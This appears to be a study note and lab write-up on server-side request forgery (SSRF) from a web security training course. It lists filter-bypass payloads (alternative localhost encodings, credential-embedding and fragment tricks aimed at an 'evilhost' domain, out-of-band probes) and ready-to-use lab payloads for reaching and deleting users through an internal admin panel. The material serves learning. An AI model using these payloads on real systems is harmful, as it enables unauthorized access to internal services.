# SSRF Attacks

### Description

* before you send an HTTP request, you can edit the parameters as you like
* that parameter would be processed by the server, so we can make the server do malicious things
* for example, a webserver would show an image from a url sent by the user via POST request. in the request, we can instead send `https://ifconfig.pro/` and the server would return its IP address

### Bypassing SSRF defenses

Sometimes blocked: `127.0.0.1`, `localhost`, `/admin`

* alternative representation: `127.0.0.1`, `2130706433`, `017700000001`, or `127.1`
* register own domain that resolves to `127.0.0.1`: use `spoofed.burpcollaborator.net`
* obfuscate using URL encoding or cAsE vARiaTion
* switch the protocols: `http:` to `https:`

Sometimes sites use whitelisting instead

* embed creds: `https://expectedhost.com:fakepassword@evilhost.com`
* URL fragment: `https://evilhost.com#expectedhost.com`
* DNS naming hierarchy: `https://expectedhost.com.evilhost.com`
* URL encode 1-2 times

### Blind SSRF

* OAST/Out-of-Band techniques
* generate unique domain names, send it to payload, and if http request/DNS lookup coming from the app, then the app is vulnerable
* Referer header -> some sites use analytics software to track where users come from and what the referrer sites are about

## Lab Solutions

#### Lab 1

Change the parameter to `stockApi=http://localhost/admin/`. Then, we'll get the admin page on the response. Notice how the href to delete user Carlos is `admin/delete?username=carlos`. Then, we just update the payload to be `stockApi=http://localhost/admin/delete?username=carlos`.

#### Lab 2

Look at the HTTP request and pass it to Intruder as `stockApi=http://192.168.0.§x§/admin:8080`. Iterate from 0-255 and wait for the one with a different response. Then update the IP on the request and the rest is the same as the previous lab. Final payload: `stockApi=http://192.168.0.99:8080/admin/delete?username=carlos`

#### Lab 3

Try different bypasses. This payload works: `stockApi=http://127.1/admiN/delete?username=carlos`

#### Lab 4

Do "check stock" and "next product". Put the GET request of next product (which supports redirection) to "check stock" POST request. Final payload: `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`.

#### Lab 5

Need Burp Collaborator (Pro Version) :) -- Basically, replace the Referer header with a domain created by Burp Collaborator. Then the back-end server will do DNS and HTTP request to the inputted domain.
